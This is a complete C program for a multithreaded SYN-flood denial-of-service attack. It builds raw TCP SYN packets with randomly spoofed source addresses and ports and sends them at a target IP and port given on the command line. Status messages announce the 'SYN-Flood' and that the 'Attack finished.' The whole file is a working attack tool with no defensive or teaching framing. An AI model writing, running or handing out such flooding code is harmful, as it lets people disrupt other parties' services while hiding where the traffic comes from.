#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <time.h>

#define PACKET_SIZE 4096

// Structure for thread arguments
typedef struct {
    char *target_ip;
    int target_port;
    int packets_per_thread;
} thread_args;

// Function to calculate TCP checksum
unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum;
    for (sum = 0; len > 0; len--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Function executed by each thread
void *flood_thread(void *args) {
    thread_args *t_args = (thread_args *)args;
    int sd;
    char buffer[PACKET_SIZE];
    struct iphdr *ip_header = (struct iphdr *)buffer;
    struct tcphdr *tcp_header = (struct tcphdr *)(buffer + sizeof(struct iphdr));
    struct sockaddr_in sin;

    // Prepare target address
    sin.sin_family = AF_INET;
    sin.sin_port = htons(t_args->target_port);
    sin.sin_addr.s_addr = inet_addr(t_args->target_ip);

    // Create raw socket
    if ((sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("socket() error");
        pthread_exit(NULL);
    }

    // Set socket option to allow custom IP header
    int one = 1;
    const int *val = &one;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt() error");
        close(sd);
        pthread_exit(NULL);
    }

    // Loop to send packets
    for (int i = 0; i < t_args->packets_per_thread; i++) {
        // Clear buffer
        memset(buffer, 0, PACKET_SIZE);

        // Fill IP header
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip_header->id = htons(rand());
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = rand();           // Random source IP (spoofing)
        ip_header->daddr = sin.sin_addr.s_addr;

        // Fill TCP header
        tcp_header->source = htons(rand());  // Random source port
        tcp_header->dest = sin.sin_port;
        tcp_header->seq = htonl(rand());
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;                 // Set SYN flag
        tcp_header->window = htons(5840);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        // Create pseudo-header for TCP checksum
        struct pseudo_header {
            unsigned int source_address;
            unsigned int dest_address;
            unsigned char placeholder;
            unsigned char protocol;
            unsigned short tcp_length;
            struct tcphdr tcp;
        } psh;

        psh.source_address = ip_header->saddr;
        psh.dest_address   = ip_header->daddr;
        psh.placeholder    = 0;
        psh.protocol       = IPPROTO_TCP;
        psh.tcp_length     = htons(sizeof(struct tcphdr));

        // Copy TCP header into pseudo-header
        memcpy(&psh.tcp, tcp_header, sizeof(struct tcphdr));

        // Calculate checksums
        tcp_header->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));
        ip_header->check  = csum((unsigned short *)buffer, ip_header->tot_len);

        // Send packet
        if (sendto(sd, buffer, ip_header->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // perror("sendto() error");
            // Ignore error here to keep the flow uninterrupted
        }
    }

    close(sd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads> <packets_per_thread>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int packets_per_thread = atoi(argv[4]);

    pthread_t threads[num_threads];
    thread_args t_args[num_threads];

    printf("Starting SYN-Flood on %s:%d with %d threads...\n", target_ip, target_port, num_threads);

    // Create threads
    for (int i = 0; i < num_threads; i++) {
        t_args[i].target_ip = target_ip;
        t_args[i].target_port = target_port;
        t_args[i].packets_per_thread = packets_per_thread;

        if (pthread_create(&threads[i], NULL, flood_thread, &t_args[i]) != 0) {
            perror("pthread_create() error");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}